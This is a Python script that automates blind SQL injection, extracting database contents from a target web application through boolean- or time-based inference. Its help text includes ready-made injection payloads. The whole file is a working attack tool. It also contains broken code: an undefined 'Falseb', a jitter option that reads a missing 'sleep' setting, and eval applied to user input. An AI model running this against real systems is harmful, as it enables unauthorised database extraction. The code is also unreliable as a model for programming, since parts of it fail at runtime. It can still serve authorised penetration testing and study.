#!/usr/bin/env python
# TODO:
#   Make it possible to provide a request in a file, parse that request and use it for cookies, headers, etc.
#   Save state from a log file. With an argument, use the last file to continue the injection according to the command line and last results found in the file.
#   Right now, a length or count of more than 128 is not possible. However, it takes more requests to find a bigger length/count than actually do 7 requests that give a null byte in the end. Therefore, make it either that the length/count is only available for ASCII search or find a better/faster algorithm.
#   Improve the ASCII search to make it more efficient (also either force the usage of "BETWEEN ... AND..." or implement the possibility to do lesser than or greater than).
#

import os
import sys
import copy
import json
import time
import urllib3
import logging
import argparse
import requests
import traceback

from datetime import datetime
from logging import NOTSET, DEBUG, INFO, WARNING, ERROR, CRITICAL, FATAL

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LOGGING_LEVEL = {
    "debug" : DEBUG,
    "info" : INFO,
    "warning" : WARNING,
    "error" : ERROR,
    "critical" : CRITICAL,
}

class Singleton(type):
    _instances = {}
    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            cls._instances[cls] = super(Singleton, cls).__call__(*args, **kwargs)
        return cls._instances[cls]

class ColoredFormatter(logging.Formatter):
    COLOR_SEQ = "\033[1;{}m"
    RESET_SEQ = "\033[0m"

    COLORS = {
        'DEBUG': 6,
        'INFO': 4,
        'WARNING': 3,
        'ERROR': 1,
        'CRITICAL': 1,
        'FATAL': 1,
    }

    def __init__(self, fmt, useColor=True):
        logging.Formatter.__init__(self, fmt)
        self.__useColor = useColor

    def format(self, record):
        if self.__useColor and record.levelname in self.COLORS:
            record.msg = "{color}{msg}{reset}".format(color=self.COLOR_SEQ.format(30 + self.COLORS[record.levelname]),msg=record.msg,reset=self.RESET_SEQ)
            record.msg = "{color}{msg}{reset}".format(color=self.COLOR_SEQ.format(30 + self.COLORS[record.levelname]),msg=record.msg,reset=self.RESET_SEQ)

        return logging.Formatter.format(self, record)

    def toggleUseColor(self, useColor):
        self.__useColor = useColor
        
class Logger(object, metaclass=Singleton):
    def __init__(self, logDir="results"):
        logfilename = "{dir}/{fname}.{ext}".format(dir=logDir, fname=datetime.utcnow().strftime("%Y-%m-%d_%H%M%S.%f"), ext="txt")
        self.__logger = logging.getLogger(logfilename)
        self.__logger.setLevel(DEBUG)

        self.__fh = logging.FileHandler(logfilename)
        self.__fh.setLevel(DEBUG)
        self.__fh.setFormatter(logging.Formatter(fmt="[%(levelname)s] %(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S"))

        self.__colorFormatter = ColoredFormatter(fmt="%(message)s", useColor=False)

        self.__sh = logging.StreamHandler()
        self.__sh.setLevel(INFO)
        self.__sh.setFormatter(self.__colorFormatter)

        self.__logger.addHandler(self.__fh)
        self.__logger.addHandler(self.__sh)
        
    def __getattr__(self, attr):
        return self.__logger.__getattribute__(attr)

    def updateStreamLevel(self, level):
        self.__logger.setLevel(level)
        #self.__fh.setLevel(level)
        #self.__sh.setLevel(level)

    def updateUseColor(self, useColor):
        self.__colorFormatter.toggleUseColor(useColor)

def injection(*args, **kwargs):
    try:
        MIN = kwargs["min_ascii"]
        MAX = kwargs["max_ascii"]

        continuing = True

        answer = ""
        index = len(answer)+1
        
        answers = []
        zindex = len(answers)
        
        minAscii = MIN
        maxAscii = MAX
        currentAscii = int((minAscii+maxAscii)/2)
    
        while continuing:
            if(kwargs["jitter"] > 0):
                time.sleep(kwargs["sleep"])
            
            data = copy.deepcopy(kwargs["data"])

            payload = kwargs["payload"].format(index=index, zindex=zindex, min=currentAscii, max=maxAscii)
            
            if("parameter" in kwargs and kwargs["parameter"] in data[kwargs["type"]]):
                data[kwargs["type"]][kwargs["parameter"]] = data[kwargs["type"]][kwargs["parameter"]].format(payload=payload)
            
            url = kwargs["url"].format(payload=payload)
            r = requests.__getattribute__(kwargs["method"])(url, **data, **kwargs["requests"])

            condition = False
            if(kwargs["time-based"] > 0):
                condition = r.elapsed.total_seconds() > kwargs["time-based"]
            elif(kwargs["boolean-based"] != ""):
                condition = eval(kwargs["boolean-based"])

            if(condition): #true
                minAscii = currentAscii
                currentAscii = int((minAscii+maxAscii)/2)
            else:
                maxAscii = currentAscii
                currentAscii = int((minAscii+maxAscii)/2)

            if(maxAscii - minAscii < 2):
                currentAscii = minAscii
                while True:
                    if(kwargs["jitter"] > 0):
                        time.sleep(kwargs["sleep"])

                    data = copy.deepcopy(kwargs["data"])

                    payload = kwargs["payload"].format(index=index, zindex=zindex, min=currentAscii, max=maxAscii)

                    if("parameter" in kwargs and kwargs["parameter"] in data[kwargs["type"]]):
                        data[kwargs["type"]][kwargs["parameter"]] = data[kwargs["type"]][kwargs["parameter"]].format(payload=payload)
                    
                    url = kwargs["url"].format(payload=payload)
                    r = requests.__getattribute__(kwargs["method"])(url, **data, **kwargs["requests"])
                    condition = False
                    if(kwargs["time-based"] > 0):
                        condition = r.elapsed.total_seconds() > kwargs["time-based"]
                    elif(kwargs["boolean-based"] != ""):
                        condition = eval(kwargs["boolean-based"])

                    if(condition): #true
                        answer += chr(currentAscii)
                        Logger().debug("Found {} - {}".format(currentAscii, answer))
                        Logger().info(answer)
                        minAscii = MIN
                        maxAscii = MAX
                        currentAscii = int((minAscii+maxAscii)/2)
                        index+=1
                        break
                    else:
                        currentAscii+=1
                    if(currentAscii == maxAscii+1):
                        if(answer == ""):
                            continuing = False
                            break
                        Logger().warning(answer)
                        answers.append(answer)
                        Logger().info(", ".join(answers))
                        answer = ""
                        minAscii = MIN
                        maxAscii = MAX
                        currentAscii = int((minAscii+maxAscii)/2)
                        index=1
                        zindex+=1
                        break
    except KeyboardInterrupt:
        pass
    except Exception as e:
        Logger().critical(traceback.format_exc())
        pass
    finally:
        if(answers):
            Logger().warning(", ".join(answers))
        else:
            Logger().info("No results.")

def doInjectionUsingBinary(*args, **kwargs):
    answers = []
    zindex = len(answers)

    originalPayload = kwargs["payload"]
    originalCountRowsPayload = kwargs["count_rows"]
    originalFindLengthPayload = kwargs["find_length"]

    # Delete the keywords count_rows and find_length so if they are not set, the script will not get confused during the extraction.
    del kwargs["count_rows"]
    del kwargs["find_length"]
    
    # If the query only fetch one thing (example (SELECT @@version)), then make the count at 1.
    if(not "{zindex}" in originalPayload):
        count = 1
    else:
        count = 0
    
    try:
        while count == 0 or zindex < count:
            if(originalCountRowsPayload and count == 0):
                # Set back the keyword count_rows so the function knows it's for a count.
                kwargs["count_rows"] = originalCountRowsPayload
                kwargs["payload"] = originalCountRowsPayload.format(bindex="{bindex}")
                
                # Keep the count variable for this loop, no need to put it in the kwargs.
                count = injectionBinary(*args, **kwargs)
                
                Logger().info("Counted {} rows".format(count))
                
                # Delete back the keyword count_rows.
                del kwargs["count_rows"]

            if(originalFindLengthPayload):
                # Set back the keyword find_length so the function knows it's for a word length.
                kwargs["find_length"] = originalFindLengthPayload
                kwargs["payload"] = originalFindLengthPayload.format(bindex="{bindex}", zindex=zindex)

                # Set the length in the kwards so the function knows that it is useless to extract a final character equal to a null byte.
                kwargs["length"] = injectionBinary(*args, **kwargs)
                
                Logger().info("Next word of length {}".format(kwargs["length"]))
                
                # Delete back the keyword find_length.
                del kwargs["find_length"]

            kwargs["payload"] = originalPayload.format(index="{index}", bindex="{bindex}", zindex=zindex)
            answer = injectionBinary(*args, **kwargs)

            if(answer == ""):
                break
            else:
                # More of a safety net although not necessary since if the argument to find lengths is there, it should be refreshed for every single word extracted.
                if("length" in kwargs): del kwargs["length"]

                answers.append(answer)
                zindex += 1

                Logger().warning(answer)
                Logger().debug(", ".join(answers))
                
    except KeyboardInterrupt:
        pass
    except Exception as e:
        Logger().critical(traceback.format_exc())
        pass
    finally:
        if(answers):
            Logger().warning(", ".join(answers))
        else:
            Logger().info("No results.")

def injectionBinary(*args, **kwargs):
    binary = ""
    bindex = len(binary)+1
    
    answer = ""
    index = len(answer)+1

    try:
        while True:
            if("length" in kwargs and index == kwargs["length"]+1):
                return answer

            if(kwargs["jitter"] > 0):
                time.sleep(kwargs["sleep"])
            
            data = copy.deepcopy(kwargs["data"])
            payload = kwargs["payload"].format(index=index, bindex=bindex)

            if("parameter" in kwargs and kwargs["parameter"] in data[kwargs["type"]]):
                data[kwargs["type"]][kwargs["parameter"]] = data[kwargs["type"]][kwargs["parameter"]].format(payload=payload)
            
            url = kwargs["url"].format(payload=payload)
            r = requests.__getattribute__(kwargs["method"])(url, **data, **kwargs["requests"])

            condition = Falseb
            if(kwargs["time-based"] > 0):
                condition = r.elapsed.total_seconds() > kwargs["time-based"]
            elif(kwargs["boolean-based"] != ""):
                condition = eval(kwargs["boolean-based"])

            if(condition): #true
                binary += "1"
            else:
                binary += "0"

            Logger().debug("Found {}".format(binary[::-1]))
            if(bindex == 7):
                char = int(binary[::-1],2)
                if("find_length" in kwargs or "count_rows" in kwargs): 
                    return char

                if(char == 0):
                    return answer

                answer += chr(char)
                Logger().debug("Found {} - {}".format(binary[::-1], answer))
                binary = ""
                bindex = 1
                index += 1
            else:
                bindex += 1
    except KeyboardInterrupt:
        Logger().warning(answer)
        raise KeyboardInterrupt
    except Exception as e:
        Logger().critical(traceback.format_exc())
        pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='''Use the keyword {payload} (case sensitive) in the url or data parameter to make the program understand where to inject the payload.
        ''', 
        formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument(metavar="url", dest="url", help="", type=str)
    parser.add_argument(metavar="payload", dest="payload", help="", type=str)
    parser.add_argument(metavar="data", nargs='?', dest="data", help="JSON Format: '{\"username\":\"test\",\"password\":\"test\"}'", type=json.loads)
    parser.add_argument("-j", "--json", dest="json", help="Use json instead of www-form-urlencoded.", action="store_true")
    parser.add_argument("-m", "--method", dest="method", help="Default is 'get'.", choices=["get", "post", "patch", "head", "delete", "put"], default="get", type=str.lower)

    tweakParser = parser.add_argument_group("tweak arguments")
    tweakParser.add_argument("--count-rows", dest="count_rows", help="Use binary to find the number of rows before extracting (you have to use the reverse function!!). The keyword {bindex} is mandatory. Example: ' or substring(reverse(bin((select count(test) from test))),{bindex},1) = 1-- -", default="", type=str)
    tweakParser.add_argument("--find-length", dest="find_length", help="Use binary to find length of word before extracting (you have to use the reverse function!!). The keywords {bindex} and {zindex} are mandatory. Example: ' or substring(reverse(bin(length((select test from test limit {zindex},1)))),{bindex},1) = 1-- -", default="", type=str)
    tweakParser.add_argument("--use-ascii", dest="use_ascii", help="This is the default value. The keywords {index}, {zindex} and {min} are mandatory. The keyword {max} is optional. Example: ' or ascii(substring((select test from test limit {zindex},1),{index},1)) between {min} and {max}-- -", action="store_false")
    tweakParser.add_argument("--min-ascii", dest="min_ascii", help="Minimal possible value of an ascii character. (32 is the first printable ascii, and 32 is default.)", default=32, type=int)
    tweakParser.add_argument("--max-ascii", dest="max_ascii", help="Maximal possible value of an ascii character. (126 is the last printable ascii, and 126 is default.)", default=126, type=int)
    tweakParser.add_argument("--use-binary", dest="use_binary", help="Use binary to get each character (you have to use the reverse function!!). The keywords {index}, {bindex} and {zindex} are mandatory. Example: ' or substring(reverse(bin(ascii(substring((select test from test limit {zindex},1),{index},1)))),{bindex},1) = 1-- -", action="store_true")
    tweakParser.add_argument("--jitter", dest="jitter", help="Amount of time to sleep inbetween each request in seconds.", default=0, type=int)
    tweakParser.add_argument("-b", "--boolean-based", dest="boolean-based", help="Condition evaluation to know if the answer is true. Use the variable 'r' for the object requests.models.Response (e.g. \"'admin' in r.content.decode()\")", default="", type=str)
    tweakParser.add_argument("-t", "--time-based", dest="time-based", help="Time elapsed for the request to finish to know if it is true (if it takes longer than the time specified, it is true.)", default=0, type=int)

    requestParser = parser.add_argument_group("requests arguments", "These arguments are passed directly to the module requests.")
    requestParser.add_argument("-k", "--insecure", dest="verify", help="Requests parameter to verify the certificate (default is True.)", action="store_false")
    requestParser.add_argument("--allow-redirect", dest="allow_redirects", help="Requests parameter to allow redirections (default is True.)", action="store_false")
    requestParser.add_argument("--cookies", dest="cookies", help="Requests parameter for cookies. JSON Format: '{\"sessioncookie\":\"1234\"}'", type=json.loads)
    requestParser.add_argument("--headers", dest="headers", help="Requests parameter for headers. JSON Format: '{\"Authorization\":\"Bearer ey...\"}'", type=json.loads)
    requestParser.add_argument("--proxies", dest="proxies", help="Requests parameter for procies. JSON Format: '{\"https\":\"http://127.0.0.1:8080\"}'", type=json.loads)

    loggingParser = parser.add_argument_group("logging arguments")
    loggingParser.add_argument("--dir", dest="directory", help="Directory where to put the logging file (default is 'results'.)", default="results", type=str)
    loggingParser.add_argument("--level", dest="level", help="Default warning", choices=["debug","info","warning","error","critical"], default="warning", type=str)
    loggingParser.add_argument("--useColor", dest="useColor", help="Use color for the logging in console.", action="store_true")

    args = parser.parse_args()
    
    kwargs = {"requests":{}}

    logDir =  args.directory
    if(logDir == parser.get_default("directory")):
        logDir = os.path.join(os.path.dirname(os.path.realpath(__file__)), logDir)

    if(not os.path.exists(logDir)):
        os.mkdir(logDir)
    Logger(logDir)
    
    if(args.useColor):
        Logger().updateUseColor(args.useColor)

    if(args.level and args.level in LOGGING_LEVEL):
        Logger().updateStreamLevel(LOGGING_LEVEL[args.level])

    Logger().critical(" ".join(sys.argv))

    kwargs["requests"]["allow_redirects"] = args.allow_redirects
    kwargs["requests"]["cookies"] = args.cookies
    kwargs["requests"]["headers"] = args.headers
    kwargs["requests"]["proxies"] = args.proxies
    kwargs["requests"]["verify"] = args.verify

    if("{payload}" in args.url):
        pass#Logger().info(args.url.format(payload=args.payload))
    elif(args.data and "{payload}" in json.dumps(args.data)):
        pass#Logger().info(args.data)
    else:
        Logger().error("Use the keyword {payload} (case sensitive) in the url or data parameters to make the program understand where to inject the payload. ")
        sys.exit(1)

    kwargs.update(vars(args))
    del kwargs["directory"]
    del kwargs["useColor"]
    del kwargs["allow_redirects"]
    del kwargs["cookies"]
    del kwargs["headers"]
    del kwargs["proxies"]
    del kwargs["verify"]

    if(kwargs["data"]):
        kwargs["type"] = "data" if not kwargs["json"] else "json"
        p = ""
        for k,v in kwargs["data"].items():
            if(isinstance(v, str)):
                if("{payload}" in v):
                    kwargs["parameter"] = k
                    break
        kwargs["data"] = {kwargs["type"]: kwargs["data"]}
    else:
        kwargs["data"] = {}

    if(args.use_binary):
        doInjectionUsingBinary(**kwargs)
    else:
        injection(**kwargs)
